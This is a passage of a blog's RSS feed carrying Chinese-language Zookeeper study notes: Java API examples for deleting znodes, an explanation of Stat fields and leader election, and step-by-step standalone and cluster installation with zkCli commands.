class="token punctuation">)</span><span class="token punctuation">,</span> stat<span class="token punctuation">.</span><span class="token function">getVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-删除空节点"><a href="#10-删除空节点" class="headerlink" title="10 删除空节点"></a>10 删除空节点</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> KeeperException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//判断节点是否存在</span>    Stat stat <span class="token operator">=</span> zkClient<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token string">"/aaa"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>stat <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"节点不存在..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    zkClient<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token string">"/aaa"</span><span class="token punctuation">,</span> stat<span class="token punctuation">.</span><span class="token function">getVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="11-删除非空节点-递归实现"><a href="#11-删除非空节点-递归实现" class="headerlink" title="11 删除非空节点,递归实现"></a>11 删除非空节点,递归实现</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//封装一个方法,方便递归调用</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">deleteAll</span><span class="token punctuation">(</span>String path<span class="token punctuation">,</span> ZooKeeper zk<span class="token punctuation">)</span> <span class="token keyword">throws</span> KeeperException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//判断节点是否存在</span>    Stat stat <span class="token operator">=</span> zkClient<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>stat <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"节点不存在..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//先获取当前传入节点下的所有子节点</span>    List<span class="token operator">&lt;</span>String<span class="token operator">></span> children <span class="token operator">=</span> zk<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>children<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//说明传入的节点没有子节点,可以直接删除</span>        zk<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> stat<span class="token punctuation">.</span><span class="token function">getVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//如果传入的节点有子节点,循环所有子节点</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>String child <span class="token operator">:</span> children<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//删除子节点,但是不知道子节点下面还有没有子节点,所以递归调用</span>            <span class="token function">deleteAll</span><span class="token punctuation">(</span>path <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> child<span class="token punctuation">,</span> zk<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//删除完所有子节点以后,记得删除传入的节点</span>        zk<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> stat<span class="token punctuation">.</span><span class="token function">getVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//测试deleteAll</span><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testDeleteAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> KeeperException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">deleteAll</span><span class="token punctuation">(</span><span class="token string">"/atguigu"</span><span class="token punctuation">,</span>zkClient<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Zookeeper/">Zookeeper</category>
      
      
      <comments>https://m01ly.github.io/2020/12/01/bigdata-zookeeper3-API/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Zookeeper学习笔记（二） 架构解析</title>
      <link>https://m01ly.github.io/2020/12/01/bigdata-zookeeper2-framework/</link>
      <guid>https://m01ly.github.io/2020/12/01/bigdata-zookeeper2-framework/</guid>
      <pubDate>Tue, 01 Dec 2020 05:22:37 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-节点类型"><a href="#1-节点类型" class="headerlink" title="1 节点类型"></a>1 节点类型</h2><p>​                       <img src="/2020/12/01/bigdata-zookeeper2-framework/1638340173624.png" alt="1638340173624">         </p><h2 id="2-Stat结构体"><a href="#2-Stat结构体" class="headerlink" title="2 Stat结构体"></a>2 Stat结构体</h2><p>（1）czxid-创建节点的事务zxid</p><p>每次修改ZooKeeper状态都会收到一个zxid形式的时间戳，也就是ZooKeeper事务ID。</p><p>事务ID是ZooKeeper中所有修改总的次序。每个修改都有唯一的zxid，如果zxid1小于zxid2，那么zxid1在zxid2之前发生。</p><p>（2）ctime - znode被创建的毫秒数(从1970年开始)</p><p>（3）mzxid - znode最后更新的事务zxid</p><p>（4）mtime - znode最后修改的毫秒数(从1970年开始)</p><p>（5）pZxid-znode最后更新的子节点zxid</p><p>（6）cversion - znode子节点变化号，znode子节点修改次数</p><p>（7）dataversion - znode数据变化号</p><p>（8）aclVersion - znode访问控制列表的变化号</p><p>（9）ephemeralOwner- 如果是临时节点，这个是znode拥有者的session id。如果不是临时节点则是0。</p><p>（10）dataLength- znode的数据长度</p><p>（11）numChildren - znode子节点数量</p><h2 id="3-监听器原理（面试重点）"><a href="#3-监听器原理（面试重点）" class="headerlink" title="3 监听器原理（面试重点）"></a>3 监听器原理（面试重点）</h2><p>   <img src="/2020/12/01/bigdata-zookeeper2-framework/1638340203888.png" alt="1638340203888"></p><h2 id="4-选举机制（面试重点）"><a href="#4-选举机制（面试重点）" class="headerlink" title="4 选举机制（面试重点）"></a>4 选举机制（面试重点）</h2><p>（1）半数机制：集群中半数以上机器存活，集群可用。所以Zookeeper适合安装奇数台服务器。</p><p>（2）Zookeeper虽然在配置文件中并没有指定Master和Slave。但是，Zookeeper工作时，是有一个节点为Leader，其他则为Follower，Leader是通过内部的选举机制临时产生的。</p><p>（3）以一个简单的例子来说明整个选举的过程。</p><p>假设有五台服务器组成的Zookeeper集群，它们的id从1-5，同时它们都是最新启动的，也就是没有历史数据，在存放数据量这一点上，都是一样的。假设这些服务器依序启动，来看看会发生什么。</p><p>  <img src="/2020/12/01/bigdata-zookeeper2-framework/1638340230133.png" alt="1638340230133"></p><p>Zookeeper的选举机制</p><p>（1）服务器1启动，发起一次选举。服务器1投自己一票。此时服务器1票数一票，不够半数以上（3票），选举无法完成，服务器1状态保持为LOOKING；</p><p>（2）服务器2启动，再发起一次选举。服务器1和2分别投自己一票并交换选票信息：此时服务器1发现服务器2的ID比自己目前投票推举的（服务器1）大，更改选票为推举服务器2。此时服务器1票数0票，服务器2票数2票，没有半数以上结果，选举无法完成，服务器1，2状态保持LOOKING</p><p>（3）服务器3启动，发起一次选举。此时服务器1和2都会更改选票为服务器3。此次投票结果：服务器1为0票，服务器2为0票，服务器3为3票。此时服务器3的票数已经超过半数，服务器3当选Leader。服务器1，2更改状态为FOLLOWING，服务器3更改状态为LEADING；</p><p>（4）服务器4启动，发起一次选举。此时服务器1，2，3已经不是LOOKING状态，不会更改选票信息。交换选票信息结果：服务器3为3票，服务器4为1票。此时服务器4服从多数，更改选票信息为服务器3，并更改状态为FOLLOWING；</p><p>（5）服务器5启动，同4一样当小弟。</p><h2 id="5-写数据流程"><a href="#5-写数据流程" class="headerlink" title="5 写数据流程"></a>5 写数据流程</h2><p><img src="/2020/12/01/bigdata-zookeeper2-framework/1638340252879.png" alt="1638340252879"></p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Zookeeper/">Zookeeper</category>
      
      
      <comments>https://m01ly.github.io/2020/12/01/bigdata-zookeeper2-framework/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Zookeeper学习笔记（一） 搭建教程</title>
      <link>https://m01ly.github.io/2020/12/01/bigdata-zookeeper1-setup/</link>
      <guid>https://m01ly.github.io/2020/12/01/bigdata-zookeeper1-setup/</guid>
      <pubDate>Tue, 01 Dec 2020 03:22:37 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-Zookeeper入门"><a href="#1-Zookeeper入门" class="headerlink" title="1 Zookeeper入门"></a>1 Zookeeper入门</h1><h2 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h2><p>Zookeeper是一个开源的分布式的，为分布式应用提供协调服务的Apache项目。</p><p>Zookeeper从设计模式角度来理解，是一个基于观察者模式设计的分布式服务管理框架，它负责存储和管理大家都关心的数据，然后接受观察者的注册，一旦这些数据的状态发生了变化，Zookeeper就负责通知已经在Zookeeper上注册的那些观察者做出相应的反应.</p><p><strong>Zookeeper = 文件系统 + 通知机制</strong></p><p>​                          <img src="/2020/12/01/bigdata-zookeeper1-setup/1638329279116.png" alt="1638329279116">      </p><h2 id="1-2-特点"><a href="#1-2-特点" class="headerlink" title="1.2 特点"></a>1.2 特点</h2><p>  <img src="/2020/12/01/bigdata-zookeeper1-setup/1638329307358.png" alt="1638329307358"></p><p>（1）zookeeper：一个领导者（leader），多个跟随者（Followers）组成的集群。</p><p><strong>（2）集群中只要又半数以上节点存货，zookeeper集群就能正常服务。</strong></p><p>（3）全局数据一致性，每个server保存一份相同的数据副本，client无论连接到哪里，数据都是一致的。</p><p>（4）更新请求顺序进行，来自同一个client的更新请求按其发送顺序依次执行。</p><p>（5）数据更新原子性，一次数据更新要么成功，要么失败。</p><p>（6）实时性：在一定时间范围内，client能读到最新数据</p><h2 id="1-3-数据结构"><a href="#1-3-数据结构" class="headerlink" title="1.3 数据结构"></a>1.3 数据结构</h2><p> ZooKeeper数据模型与Unix文件系统很类似，整体上可以看作是一棵树，每个节点称作一个ZNode。每个ZNode默认能够存储1MB的数据，每个ZNode都可以通过其路径唯一标识。</p><p><img src="/2020/12/01/bigdata-zookeeper1-setup/1638329609040.png" alt="1638329609040"></p><h2 id="1-4-应用场景"><a href="#1-4-应用场景" class="headerlink" title="1.4 应用场景"></a>1.4 应用场景</h2><p>提供的服务包括：统一命名服务、统一配置管理、统一集群管理、服务器节点动态上下线、软负载均衡等。</p><h3 id="1-4-1-统一服务命名服务"><a href="#1-4-1-统一服务命名服务" class="headerlink" title="1.4.1 统一服务命名服务"></a>1.4.1 统一服务命名服务</h3><p><img src="/2020/12/01/bigdata-zookeeper1-setup/1638329641759.png" alt="1638329641759"></p><h3 id="1-4-2-统一配置管理"><a href="#1-4-2-统一配置管理" class="headerlink" title="1.4.2  统一配置管理"></a>1.4.2  统一配置管理</h3><p>  <img src="/2020/12/01/bigdata-zookeeper1-setup/1638329675526.png" alt="1638329675526"></p><h3 id="1-4-3-统一集群管理"><a href="#1-4-3-统一集群管理" class="headerlink" title="1.4.3 统一集群管理"></a>1.4.3 统一集群管理</h3><p>  <img src="/2020/12/01/bigdata-zookeeper1-setup/1638329704193.png" alt="1638329704193"></p><h3 id="1-4-4-服务器节点动态上下线"><a href="#1-4-4-服务器节点动态上下线" class="headerlink" title="1.4.4  服务器节点动态上下线"></a>1.4.4  服务器节点动态上下线</h3><p><img src="/2020/12/01/bigdata-zookeeper1-setup/1638329743811.png" alt="1638329743811"></p><h3 id="1-4-5-软负载均衡"><a href="#1-4-5-软负载均衡" class="headerlink" title="1.4.5 软负载均衡"></a>1.4.5 软负载均衡</h3><p><img src="/2020/12/01/bigdata-zookeeper1-setup/1638329814579.png" alt="1638329814579"></p><h2 id="1-5-下载地址"><a href="#1-5-下载地址" class="headerlink" title="1.5 下载地址"></a>1.5 下载地址</h2><p>1）官网首页：</p><p><a href="https://zookeeper.apache.org/">https://zookeeper.apache.org/</a></p><p>2）下载截图</p><p><img src="/2020/12/01/bigdata-zookeeper1-setup/1638339458131.png" alt="1638339458131"></p><h1 id="2-Zookeeper安装"><a href="#2-Zookeeper安装" class="headerlink" title="2 Zookeeper安装"></a>2 Zookeeper安装</h1><h2 id="2-1-本地模式安装部署"><a href="#2-1-本地模式安装部署" class="headerlink" title="2.1 本地模式安装部署"></a>2.1 本地模式安装部署</h2><p>1）安装前准备</p><p>（1）安装Jdk</p><p>（2）拷贝Zookeeper安装包到Linux系统下</p><p>（3）解压到指定目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf zookeeper-3.5.7.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）配置修改</p><p>（1）将/opt/module/zookeeper-3.5.7/conf这个路径下的zoo_sample.cfg修改为zoo.cfg；</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ <span class="token function">mv</span> zoo_sample.cfg zoo.cfg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> （2）打开zoo.cfg文件，修改dataDir路径：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zookeeper-3.5.7<span class="token punctuation">]</span>$ vim zoo.cfg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改如下内容：</p><pre class="line-numbers language-bash"><code class="language-bash">dataDir<span class="token operator">=</span>/opt/module/zookeeper-3.5.7/zkData<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> （3）在/opt/module/zookeeper-3.5.7/这个目录上创建zkData文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zookeeper-3.5.7<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> zkData<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）操作Zookeeper</p><p>（1）启动Zookeeper</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zookeeper-3.5.7<span class="token punctuation">]</span>$ bin/zkServer.sh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）查看进程是否启动</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zookeeper-3.5.7<span class="token punctuation">]</span>$ jps4020 Jps4001 QuorumPeerMain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（3）查看状态：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zookeeper-3.5.7<span class="token punctuation">]</span>$ bin/zkServer.sh statusZooKeeper JMX enabled by defaultUsing config: /opt/module/zookeeper-3.5.7/bin/<span class="token punctuation">..</span>/conf/zoo.cfgMode: standalone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（4）启动客户端：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zookeeper-3.5.7<span class="token punctuation">]</span>$ bin/zkCli.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（5）退出客户端：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 0<span class="token punctuation">]</span> quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（6）停止Zookeeper</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zookeeper-3.5.7<span class="token punctuation">]</span>$ bin/zkServer.sh stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-2-配置参数解读"><a href="#2-2-配置参数解读" class="headerlink" title="2.2 配置参数解读"></a>2.2 配置参数解读</h2><p>Zookeeper中的配置文件zoo.cfg中参数含义解读如下：</p><p>1）tickTime =2000：通信心跳数，Zookeeper服务器与客户端心跳时间，单位毫秒</p><p>Zookeeper使用的基本时间，服务器之间或客户端与服务器之间维持心跳的时间间隔，也就是每个tickTime时间就会发送一个心跳，时间单位为毫秒。</p><p>它用于心跳机制，并且设置最小的session超时时间为两倍心跳时间。(session的最小超时时间是2*tickTime)</p><p>2）initLimit =10：LF初始通信时限</p><p>集群中的Follower跟随者服务器与Leader领导者服务器之间初始连接时能容忍的最多心跳数（tickTime的数量），用它来限定集群中的Zookeeper服务器连接到Leader的时限。</p><p>3）syncLimit =5：LF同步通信时限</p><p>集群中Leader与Follower之间的最大响应时间单位，假如响应超过syncLimit * tickTime，Leader认为Follwer死掉，从服务器列表中删除Follwer。</p><p>4）dataDir：数据文件目录+数据持久化路径</p><p>主要用于保存Zookeeper中的数据。</p><p>5）clientPort =2181：客户端连接端口</p><p>监听客户端连接的端口。</p><h2 id="2-3-分布式安装部署"><a href="#2-3-分布式安装部署" class="headerlink" title="2.3 分布式安装部署"></a>2.3 分布式安装部署</h2><p>1）集群规划</p><p>在hadoop102、hadoop103和hadoop104三个节点上部署Zookeeper。</p><p>2）解压安装</p><p>（1）解压Zookeeper安装包到/opt/module/目录下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf zookeeper-3.5.7.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）同步/opt/module/zookeeper-3.5.7目录内容到hadoop103、hadoop104</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ xsync zookeeper-3.5.7/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）配置服务器编号</p><p>（1）在/opt/module/zookeeper-3.5.7/这个目录下创建zkData</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zookeeper-3.5.7<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> -p zkData<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）在/opt/module/zookeeper-3.5.7/zkData目录下创建一个myid的文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zkData<span class="token punctuation">]</span>$ <span class="token function">touch</span> myid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加myid文件，注意一定要在linux里面创建，在notepad++里面很可能乱码</p><p>（3）编辑myid文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zkData<span class="token punctuation">]</span>$ <span class="token function">vi</span> myid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在文件中添加与server对应的编号：</p><pre class="line-numbers language-sh"><code class="language-sh">2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）拷贝配置好的zookeeper到其他机器上</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zkData<span class="token punctuation">]</span>$ xsync myid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并分别在hadoop103、hadoop104上修改myid文件中内容为3、4</p><p>4）配置zoo.cfg文件</p><p>（1）重命名/opt/module/zookeeper-3.5.7/conf这个目录下的zoo_sample.cfg为zoo.cfg</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ <span class="token function">mv</span> zoo_sample.cfg zoo.cfg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）打开zoo.cfg文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ vim zoo.cfg<span class="token comment" spellcheck="true">#修改数据存储路径配置</span>dataDir<span class="token operator">=</span>/opt/module/zookeeper-3.5.7/zkData<span class="token comment" spellcheck="true">#增加如下配置</span><span class="token comment" spellcheck="true">#######################cluster##########################</span>server.2<span class="token operator">=</span>hadoop102:2888:3888server.3<span class="token operator">=</span>hadoop103:2888:3888server.4<span class="token operator">=</span>hadoop104:2888:3888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）同步zoo.cfg配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ xsync zoo.cfg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）配置参数解读</p><p>server.A=B:C:D。</p><p>A是一个数字，表示这个是第几号服务器；</p><p>集群模式下配置一个文件myid，这个文件在dataDir目录下，这个文件里面有一个数据就是A的值，Zookeeper启动时读取此文件，拿到里面的数据与zoo.cfg里面的配置信息比较从而判断到底是哪个server。</p><p>B是这个服务器的地址；</p><p>C是这个服务器Follower与集群中的Leader服务器交换信息的端口；</p><p>D是万一集群中的Leader服务器挂了，需要一个端口来重新进行选举，选出一个新的Leader，而这个端口就是用来执行选举时服务器相互通信的端口。</p><p>5）集群操作</p><p>（1）分别启动Zookeeper</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zookeeper-3.5.7<span class="token punctuation">]</span>$ bin/zkServer.sh start<span class="token punctuation">[</span>molly@hadoop103 zookeeper-3.5.7<span class="token punctuation">]</span>$ bin/zkServer.sh start<span class="token punctuation">[</span>molly@hadoop104 zookeeper-3.5.7<span class="token punctuation">]</span>$ bin/zkServer.sh start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（2）查看状态</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zookeeper-3.5.7<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># bin/zkServer.sh status</span>JMX enabled by defaultUsing config: /opt/module/zookeeper-3.5.7/bin/<span class="token punctuation">..</span>/conf/zoo.cfgMode: follower<span class="token punctuation">[</span>molly@hadoop103 zookeeper-3.5.7<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># bin/zkServer.sh status</span>JMX enabled by defaultUsing config: /opt/module/zookeeper-3.5.7/bin/<span class="token punctuation">..</span>/conf/zoo.cfgMode: leader<span class="token punctuation">[</span>molly@hadoop104 zookeeper-3.5.7<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># bin/zkServer.sh status</span>JMX enabled by defaultUsing config: /opt/module/zookeeper-3.5.7/bin/<span class="token punctuation">..</span>/conf/zoo.cfgMode: follower<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-客户端命令行操作"><a href="#3-客户端命令行操作" class="headerlink" title="3 客户端命令行操作"></a>3 客户端命令行操作</h1><table><thead><tr><th>命令基本语法</th><th>功能描述</th></tr></thead><tbody><tr><td>help</td><td>显示所有操作命令</td></tr><tr><td>ls path</td><td>使用 ls 命令来查看当前znode的子节点  -w 监听子节点变化  -s  附加次级信息</td></tr><tr><td>create</td><td>普通创建  -s 含有序列  -e 临时（重启或者超时消失）</td></tr><tr><td>get path</td><td>获得节点的值  -w 监听节点内容变化  -s  附加次级信息</td></tr><tr><td>set</td><td>设置节点的具体值</td></tr><tr><td>stat</td><td>查看节点状态</td></tr><tr><td>delete</td><td>删除节点</td></tr><tr><td>deleteall</td><td>递归删除节点</td></tr></tbody></table><p>1）启动客户端</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop103 zookeeper-3.5.7<span class="token punctuation">]</span>$ bin/zkCli.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）显示所有操作命令</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 1<span class="token punctuation">]</span> <span class="token function">help</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）查看当前znode中所包含的内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 0<span class="token punctuation">]</span> <span class="token function">ls</span> /<span class="token punctuation">[</span>zookeeper<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4）查看当前节点详细数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 1<span class="token punctuation">]</span> <span class="token function">ls</span> -s /<span class="token punctuation">[</span>zookeeper<span class="token punctuation">]</span>cZxid <span class="token operator">=</span> 0x0ctime <span class="token operator">=</span> Thu Jan 01 08:00:00 CST 1970mZxid <span class="token operator">=</span> 0x0mtime <span class="token operator">=</span> Thu Jan 01 08:00:00 CST 1970pZxid <span class="token operator">=</span> 0x0cversion <span class="token operator">=</span> -1dataVersion <span class="token operator">=</span> 0aclVersion <span class="token operator">=</span> 0ephemeralOwner <span class="token operator">=</span> 0x0dataLength <span class="token operator">=</span> 0numChildren <span class="token operator">=</span> 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）分别创建2个普通节点</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 3<span class="token punctuation">]</span> create /sanguo <span class="token string">"diaochan"</span>Created /sanguo<span class="token punctuation">[</span>zk: localhost:2181<span class="token punctuation">(</span>CONNECTED<span class="token punctuation">)</span> 4<span class="token punctuation">]</span> create /sanguo/shuguo <span 